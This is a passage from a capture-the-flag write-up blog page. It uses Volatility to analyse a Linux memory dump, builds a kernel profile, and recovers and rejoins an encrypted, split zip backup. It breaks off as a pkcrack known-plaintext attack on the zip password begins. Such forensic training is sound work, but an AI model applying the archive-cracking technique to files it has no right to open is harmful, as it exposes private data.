@@ -1,0 +1,654 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[Santhacklaus 2018] - Mission impossible - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta property="og:title" content="[Santhacklaus 2018] - Mission impossible"><meta property="og:description" content="Mission impossible 1 Statement (Awesome work for the video, really appreciate it as a player)
+State of the art A memory dump again :D
+1 2 3 4 5 6 7 8 9 10 11 12 $ volatility -f challenge.elf imageinfo [...] Take a looooooooong time [...] $ strings challenge.elf | grep 'Linux version' | sort | uniq 2018-12-16T11:14:09.150996-05:00 virtual-debian kernel: [ 0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4."><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/writeups/santhacklaus2018missionimpossible/"><meta property="og:image" content="/logo.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2018-12-19T21:57:40+08:00"><meta property="article:modified_time" content="2018-12-19T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/logo.png"><meta name=twitter:title content="[Santhacklaus 2018] - Mission impossible"><meta name=twitter:description content="Mission impossible 1 Statement (Awesome work for the video, really appreciate it as a player)
+State of the art A memory dump again :D
+1 2 3 4 5 6 7 8 9 10 11 12 $ volatility -f challenge.elf imageinfo [...] Take a looooooooong time [...] $ strings challenge.elf | grep 'Linux version' | sort | uniq 2018-12-16T11:14:09.150996-05:00 virtual-debian kernel: [ 0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4."><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/writeups/santhacklaus2018missionimpossible/><link rel=prev href=maki.bzh/writeups/santhacklaus2018netrunner/><link rel=next href=maki.bzh/writeups/santhacklaus2018bretstiles/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[Santhacklaus 2018] - Mission impossible","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/writeups\/santhacklaus2018missionimpossible\/"},"image":["\/images\/Apple-Devices-Preview.png"],"genre":"writeups","keywords":"santhacklaus, pinkflood, volatility, linux, profile, zip, det","wordcount":2120,"url":"maki.bzh\/writeups\/santhacklaus2018missionimpossible\/","datePublished":"2018-12-19T21:57:40+08:00","dateModified":"2018-12-19T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[Santhacklaus 2018] - Mission impossible</h1><div class=content id=content><h2 id=mission-impossible-1>Mission impossible 1</h2><h3 id=statement>Statement</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi1.png data-srcset="/lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi1.png, /lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi1.png 1.5x, /lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi1.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi1.png title=/lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi1.png></p><iframe width=560 height=315 src=https://www.youtube.com/embed/pEfI3ZrLDBs frameborder=0 allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><p>(Awesome work for the video, really appreciate it as a player)</p><h3 id=state-of-the-art>State of the art</h3><p>A memory dump again :D</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/yoJC2GnSClbPOkV0eA/giphy.gif data-srcset="https://media.giphy.com/media/yoJC2GnSClbPOkV0eA/giphy.gif, https://media.giphy.com/media/yoJC2GnSClbPOkV0eA/giphy.gif 1.5x, https://media.giphy.com/media/yoJC2GnSClbPOkV0eA/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/yoJC2GnSClbPOkV0eA/giphy.gif title=https://media.giphy.com/media/yoJC2GnSClbPOkV0eA/giphy.gif></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ volatility -f challenge.elf imageinfo
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>Take a looooooooong <span class=nb>time</span> 
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ strings challenge.elf <span class=p>|</span> grep <span class=s1>&#39;Linux version&#39;</span> <span class=p>|</span> sort <span class=p>|</span> uniq
+</span></span><span class=line><span class=cl>2018-12-16T11:14:09.150996-05:00 virtual-debian kernel: <span class=o>[</span>    0.000000<span class=o>]</span> Linux version 3.16.0-6-amd64 <span class=o>(</span>debian-kernel@lists.debian.org<span class=o>)</span> <span class=o>(</span>gcc version 4.9.2 <span class=o>(</span>Debian 4.9.2-10+deb8u1<span class=o>)</span> <span class=o>)</span> <span class=c1>#1 SMP Debian 3.16.57-2 (2018-07-14)</span>
+</span></span><span class=line><span class=cl>Dec <span class=m>16</span> 11:14:09 virtual-debian kernel: <span class=o>[</span>    0.000000<span class=o>]</span> Linux version 3.16.0-6-amd64 <span class=o>(</span>debian-kernel@lists.debian.org<span class=o>)</span> <span class=o>(</span>gcc version 4.9.2 <span class=o>(</span>Debian 4.9.2-10+deb8u1<span class=o>)</span> <span class=o>)</span> <span class=c1>#1 SMP Debian 3.16.57-2 (2018-07-14)</span>
+</span></span><span class=line><span class=cl>Dec <span class=m>16</span> 11:14:09 virtual-debian kernel: <span class=o>[</span>10295.865806<span class=o>]</span> intel_idle: does noual-debian kernel: <span class=o>[</span>    0.000000<span class=o>]</span> Linux version 3.16.0-6-amd64 <span class=o>(</span>debian-kernel@lists.debian.org<span class=o>)</span> <span class=o>(</span>gcc version 4.9.2 <span class=o>(</span>Debian 4.9.2-10+deb8u1<span class=o>)</span> <span class=o>)</span> <span class=c1>#1 SMP Debian 3.16.57-2 (2018-07-14)</span>
+</span></span><span class=line><span class=cl>Linux version 3.16.0-6-amd64 <span class=o>(</span>debian-kernel@lists.debian.org<span class=o>)</span> <span class=o>(</span>gcc version 4.9.2 <span class=o>(</span>Debian 4.9.2-10+deb8u1<span class=o>)</span> <span class=o>)</span> <span class=c1>#1 SMP Debian 3.16.57-2 (2018-07-14)</span>
+</span></span><span class=line><span class=cl>Linux version %d.%d.%d
+</span></span><span class=line><span class=cl><span class=nv>MESSAGE</span><span class=o>=</span>Linux version 3.16.0-6-amd64 <span class=o>(</span>debian-kernel@lists.debian.org<span class=o>)</span> <span class=o>(</span>gcc version 4.9.2 <span class=o>(</span>Debian 4.9.2-10+deb8u1<span class=o>)</span> <span class=o>)</span> <span class=c1>#1 SMP Debian 3.16.57-2 (2018-07-14)</span>
+</span></span></code></pre></td></tr></table></div></div><p>Ok, it&rsquo;s a linux memory dump&mldr;</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/PGxmniUblqoqQ/giphy.gif data-srcset="https://media.giphy.com/media/PGxmniUblqoqQ/giphy.gif, https://media.giphy.com/media/PGxmniUblqoqQ/giphy.gif 1.5x, https://media.giphy.com/media/PGxmniUblqoqQ/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/PGxmniUblqoqQ/giphy.gif title=https://media.giphy.com/media/PGxmniUblqoqQ/giphy.gif></p><h3 id=profile-generation>Profile generation</h3><p>To do a linux profile for volatility, we need:</p><ul><li>Linux distribution</li><li>Version of the distribution</li><li>Version of the kernel</li></ul><p>By greping on <strong>Linux version</strong> we got those informations:</p><ul><li>Debian</li><li>Debian 8 (the deb8u1)</li><li>3.16.0-6-amd64 kernel</li></ul><p>I choose to download the latest release of Debian 8: <a href=https://cdimage.debian.org/cdimage/archive/8.11.0/amd64/iso-cd/debian-8.11.0-amd64-netinst.iso target=_blank rel="noopener noreffer">https://cdimage.debian.org/cdimage/archive/8.11.0/amd64/iso-cd/debian-8.11.0-amd64-netinst.iso</a></p><p>Pro tip: Download the netinstall version of Linux, during installation, don&rsquo;t select any additional package except SSH.</p><p>When the Debian 8 VM is up, just ssh it and check the installed kernel:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ssh user@192.168.122.197
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>debianVM $ uname -a
+</span></span><span class=line><span class=cl>Linux debian 3.16.0-6-amd64 <span class=c1>#1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux</span>
+</span></span></code></pre></td></tr></table></div></div><p>It looks to be the right kernel, good. No need to install a new one. Now, install package for linux profile generation and generate it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>debianVM $ sudo apt-get install -y build-essential volatility-tools dwarfdump linux-headers-3.16.0-6-amd64
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>debianVM $ <span class=nb>cd</span> /usr/src/volatility-tools/linux/
+</span></span><span class=line><span class=cl>debianVM $ su root
+</span></span><span class=line><span class=cl>debianVM <span class=c1># make</span>
+</span></span><span class=line><span class=cl>debianVM <span class=c1># zip MI1_profile.zip /usr/src/volatility-tools/linux/module.dwarf /boot/System.map-3.16.0-6-amd64</span>
+</span></span><span class=line><span class=cl>updating: usr/src/volatility-tools/linux/module.dwarf <span class=o>(</span>deflated 91%<span class=o>)</span>
+</span></span><span class=line><span class=cl>updating: boot/System.map-3.16.0-6-amd64 <span class=o>(</span>deflated 79%<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>Our profile is created, we have to put in the right place for volatility:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo updatedb <span class=c1># I know it&#39;s deprectated :&#39;)</span>
+</span></span><span class=line><span class=cl>$ locate volatility <span class=p>|</span> grep overlays <span class=p>|</span> grep linux
+</span></span><span class=line><span class=cl>/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux
+</span></span><span class=line><span class=cl>/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/__init__.py
+</span></span><span class=line><span class=cl>/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/__init__.pyc
+</span></span><span class=line><span class=cl>/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/elf.py
+</span></span><span class=line><span class=cl>/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/elf.pyc
+</span></span><span class=line><span class=cl>/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/linux.py
+</span></span><span class=line><span class=cl>/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/linux.pyc
+</span></span></code></pre></td></tr></table></div></div><p>Place the <code>MI1_profile.zip</code> archive in <code>/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux</code> folder.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ volatility --info <span class=p>|</span> grep MI1
+</span></span><span class=line><span class=cl>LinuxMI1_profilex64   - A Profile <span class=k>for</span> Linux MI1_profile x64
+</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s try if it work, to do this, just use a linux volatility plugin, such as <code>linux_banner</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ volatility -f challenge.elf --profile<span class=o>=</span>LinuxMI1_profilex64 linux_banner
+</span></span><span class=line><span class=cl>Linux version 3.16.0-6-amd64 <span class=o>(</span>debian-kernel@lists.debian.org<span class=o>)</span> <span class=o>(</span>gcc version 4.9.2 <span class=o>(</span>Debian 4.9.2-10+deb8u1<span class=o>)</span> <span class=o>)</span> <span class=c1>#1 SMP Debian 3.16.57-2 (2018-07-14)</span>
+</span></span></code></pre></td></tr></table></div></div><p>It works!</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/4PT6v3PQKG6Yg/giphy.gif data-srcset="https://media.giphy.com/media/4PT6v3PQKG6Yg/giphy.gif, https://media.giphy.com/media/4PT6v3PQKG6Yg/giphy.gif 1.5x, https://media.giphy.com/media/4PT6v3PQKG6Yg/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/4PT6v3PQKG6Yg/giphy.gif title=https://media.giphy.com/media/4PT6v3PQKG6Yg/giphy.gif></p><p>MI1_profile.zip: <a href=https://mega.nz/#!mSRCCQ6L!HRz6qJ02pwlg89Gcc1OQ-iIgBzaAWW6EKIThFXLg3Mc target=_blank rel="noopener noreffer">https://mega.nz/#!mSRCCQ6L!HRz6qJ02pwlg89Gcc1OQ-iIgBzaAWW6EKIThFXLg3Mc</a></p><h3 id=raiders-of-the-lost-zip>Raiders of the Lost Zip</h3><p>What did the user on the system?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ volatility -f challenge.elf --profile<span class=o>=</span>LinuxMI1_profilex64 linux_bash
+</span></span><span class=line><span class=cl>Pid      Name                 Command Time                   Command
+</span></span><span class=line><span class=cl>-------- -------------------- ------------------------------ -------
+</span></span><span class=line><span class=cl>    <span class=m>1867</span> bash                 2018-12-16 16:17:45 UTC+0000   rm flag.txt 
+</span></span><span class=line><span class=cl>    <span class=m>1867</span> bash                 2018-12-16 16:17:45 UTC+0000   ls
+</span></span><span class=line><span class=cl>    <span class=m>1867</span> bash                 2018-12-16 16:17:45 UTC+0000   ls
+</span></span><span class=line><span class=cl>    <span class=m>1867</span> bash                 2018-12-16 16:17:45 UTC+0000   sudo reboot
+</span></span><span class=line><span class=cl>    <span class=m>1867</span> bash                 2018-12-16 16:17:45 UTC+0000   zip -r -e -s 64K backup.zip *
+</span></span><span class=line><span class=cl>    <span class=m>1867</span> bash                 2018-12-16 16:17:45 UTC+0000   cat /dev/urandom &gt; flag.txt 
+</span></span><span class=line><span class=cl>    <span class=m>1867</span> bash                 2018-12-16 16:17:45 UTC+0000   <span class=nb>cd</span> /var/www/a-strong-hero.com/
+</span></span><span class=line><span class=cl>    <span class=m>1867</span> bash                 2018-12-16 16:17:45 UTC+0000   sudo reboot
+</span></span><span class=line><span class=cl>    <span class=m>1867</span> bash                 2018-12-16 16:17:49 UTC+0000   <span class=nb>cd</span> /var/www/a-strong-hero.com/
+</span></span><span class=line><span class=cl>    <span class=m>1867</span> bash                 2018-12-16 16:17:49 UTC+0000   ls
+</span></span><span class=line><span class=cl>    <span class=m>1867</span> bash                 2018-12-16 16:18:09 UTC+0000   find . -type f -print0 <span class=p>|</span> xargs -0 md5sum &gt; md5sums.txt
+</span></span><span class=line><span class=cl>    <span class=m>1867</span> bash                 2018-12-16 16:18:10 UTC+0000   cat md5sums.txt
+</span></span></code></pre></td></tr></table></div></div><p>Hmmm&mldr; What an ugly zip command. After reading the zip manual, actually this command will encrypt recursively and split the original archive into 64Ko pieces. In order to find all parts, let&rsquo;s list all file opened in memory:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ volatility -f challenge.elf --profile<span class=o>=</span>LinuxMI1_profilex64 linux_find_file -L &gt; filelist 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ cat filelist <span class=p>|</span> grep backup
+</span></span><span class=line><span class=cl>          <span class=m>261933</span> 0xffff88001e61e4b0 /var/www/a-strong-hero.com/backup.z02
+</span></span><span class=line><span class=cl>          <span class=m>263120</span> 0xffff88001e61e898 /var/www/a-strong-hero.com/backup.z05
+</span></span><span class=line><span class=cl>          <span class=m>263122</span> 0xffff88001e61ec80 /var/www/a-strong-hero.com/backup.z07
+</span></span><span class=line><span class=cl>          <span class=m>263123</span> 0xffff88001e61d0c8 /var/www/a-strong-hero.com/backup.z08
+</span></span><span class=line><span class=cl>          <span class=m>263125</span> 0xffff88001e61d4b0 /var/www/a-strong-hero.com/backup.zip
+</span></span><span class=line><span class=cl>          <span class=m>261792</span> 0xffff88001e61d898 /var/www/a-strong-hero.com/backup.z01
+</span></span><span class=line><span class=cl>          <span class=m>262990</span> 0xffff88001e61dc80 /var/www/a-strong-hero.com/backup.z04
+</span></span><span class=line><span class=cl>          <span class=m>263121</span> 0xffff88001e61c0c8 /var/www/a-strong-hero.com/backup.z06
+</span></span><span class=line><span class=cl>          <span class=m>263124</span> 0xffff88001e61c4b0 /var/www/a-strong-hero.com/backup.z09
+</span></span><span class=line><span class=cl>          <span class=m>262949</span> 0xffff88001e61cc80 /var/www/a-strong-hero.com/backup.z03
+</span></span></code></pre></td></tr></table></div></div><p>I think I found all pieces! Let&rsquo;s extract them and recreate the original archive:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ volatility -f challenge.elf --profile<span class=o>=</span>LinuxMI1_profilex64 linux_find_file -i 0xffff88001e61d898 -O backup.z01
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>Reproduce the operation with correct offset <span class=k>until</span> the z09
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ zip -s <span class=m>0</span> backup.zip --out unsplit.zip
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ unzip -l unsplit.zip 
+</span></span><span class=line><span class=cl>Archive:  unsplit.zip
+</span></span><span class=line><span class=cl>  Length      Date    Time    Name
+</span></span><span class=line><span class=cl>---------  ---------- -----   ----
+</span></span><span class=line><span class=cl>       <span class=m>30</span>  2018-12-16 16:57   flag.txt
+</span></span><span class=line><span class=cl>        <span class=m>0</span>  2018-12-16 15:51   jcvd-website/
+</span></span><span class=line><span class=cl>        <span class=m>0</span>  2018-12-16 15:51   jcvd-website/js/
+</span></span><span class=line><span class=cl>     <span class=m>6148</span>  2018-12-16 15:51   jcvd-website/js/.DS_Store
+</span></span><span class=line><span class=cl>    <span class=m>36816</span>  2018-12-16 15:51   jcvd-website/js/bootstrap.min.js
+</span></span><span class=line><span class=cl>    <span class=m>95957</span>  2018-12-16 15:51   jcvd-website/js/jquery-1.11.3.min.js
+</span></span><span class=line><span class=cl>    <span class=m>68890</span>  2018-12-16 15:51   jcvd-website/js/bootstrap.js
+</span></span><span class=line><span class=cl>       <span class=m>79</span>  2018-12-16 15:51   jcvd-website/js/custom.js
+</span></span><span class=line><span class=cl>      <span class=m>641</span>  2018-12-16 15:51   jcvd-website/js/ie10-viewport-bug-workaround.js
+</span></span><span class=line><span class=cl>     <span class=m>5564</span>  2018-12-16 15:51   jcvd-website/js/jquery.easing.min.js
+</span></span><span class=line><span class=cl>    <span class=m>12292</span>  2018-12-16 15:51   jcvd-website/.DS_Store
+</span></span><span class=line><span class=cl>        <span class=m>0</span>  2018-12-16 15:51   jcvd-website/images/
+</span></span><span class=line><span class=cl>    <span class=m>37682</span>  2018-12-16 15:51   jcvd-website/images/concert.jpg
+</span></span><span class=line><span class=cl>     <span class=m>6148</span>  2018-12-16 15:51   jcvd-website/images/.DS_Store
+</span></span><span class=line><span class=cl>    <span class=m>52003</span>  2018-12-16 15:51   jcvd-website/images/microphone.jpg
+</span></span><span class=line><span class=cl>    <span class=m>49276</span>  2018-12-16 15:51   jcvd-website/images/iphone.jpg
+</span></span><span class=line><span class=cl>    <span class=m>91733</span>  2018-12-16 15:51   jcvd-website/images/header.jpg
+</span></span><span class=line><span class=cl>    <span class=m>26267</span>  2018-12-16 15:51   jcvd-website/images/writing.jpg
+</span></span><span class=line><span class=cl>   <span class=m>133773</span>  2018-12-16 15:51   jcvd-website/images/pencil_sharpener.jpg
+</span></span><span class=line><span class=cl>     <span class=m>7384</span>  2018-12-16 15:51   jcvd-website/index.html
+</span></span><span class=line><span class=cl>        <span class=m>0</span>  2018-12-16 15:51   jcvd-website/fonts/
+</span></span><span class=line><span class=cl>    <span class=m>45404</span>  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.ttf
+</span></span><span class=line><span class=cl>    <span class=m>18028</span>  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.woff2
+</span></span><span class=line><span class=cl>    <span class=m>23424</span>  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.woff
+</span></span><span class=line><span class=cl>    <span class=m>20127</span>  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.eot
+</span></span><span class=line><span class=cl>   <span class=m>108738</span>  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.svg
+</span></span><span class=line><span class=cl>        <span class=m>0</span>  2018-12-16 15:51   jcvd-website/css/
+</span></span><span class=line><span class=cl>     <span class=m>6148</span>  2018-12-16 15:51   jcvd-website/css/.DS_Store
+</span></span><span class=line><span class=cl>   <span class=m>147430</span>  2018-12-16 15:51   jcvd-website/css/bootstrap.css
+</span></span><span class=line><span class=cl>     <span class=m>8335</span>  2018-12-16 15:51   jcvd-website/css/custom.css
+</span></span><span class=line><span class=cl>   <span class=m>122540</span>  2018-12-16 15:51   jcvd-website/css/bootstrap.min.css
+</span></span><span class=line><span class=cl>---------                     -------
+</span></span><span class=line><span class=cl>  <span class=m>1130857</span>                     <span class=m>31</span> files
+</span></span></code></pre></td></tr></table></div></div><p>The archive is password protected, but we can break pkzip encryption with known plaintext attack using <code>pkcrack</code>. I need a clear file and the same file encrypted in the zip archive. I choosed <code>microphone.jpg</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
